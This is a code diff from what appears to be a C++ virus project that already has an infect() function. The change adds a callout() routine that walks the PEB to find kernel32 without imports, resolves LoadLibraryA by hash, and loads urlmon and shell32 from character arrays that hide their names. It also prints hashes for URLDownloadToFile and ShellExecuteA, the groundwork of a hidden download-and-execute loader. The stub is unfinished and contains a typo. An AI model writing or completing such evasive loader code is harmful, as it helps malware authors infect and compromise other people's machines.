@@ -340,8 +340,64 @@ int infect(void)
    return 0;
 }
 
+void callback(void)
+{
+   return;
+}
+
+int callout(void)
+{
+   /* TODO pushad at the top of the function */
+   
+   void (*entrypoint)() = callback;
+#if defined(BROODSAC32)
+   PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
+#elif defined(BROODSAC64)
+   PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
+#endif
+
+   PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
+   PLIST_ENTRY list_entry = ldr->InLoadOrderModuleList.Flink;
+   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = nullptr;
+
+   while (list_entry != nullptr)
+   {
+      PFULL_LDR_DATA_TABLE_ENTRY table_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry);
+
+      if (table_entry->BaseDllName.Buffer == nullptr)
+      {
+         list_entry = nullptr;
+         continue;
+      }
+
+      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
+      {
+         kernel32 = table_entry;
+         break;
+      }
+      
+      list_entry = table_entry->InLoadOrderLinks.Flink;
+   }
+
+   if (kernel32 == nullptr)
+      return 1;
+
+   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
+   char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
+   PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
+   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
+   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
+   SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
+
+   std::wcout << "URLDownloadToFile: " << std::hex << fnv321a("URLDownloadToFile") << std::endl;
+   std::wcout << "ShellExecuteA: " << std::hex << fnv321a("ShellExecuteA") << std::endl;
+
+   return 0;
+}
+
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
-   infect();
+   //infect();
+   callout();
    return 0;
 }
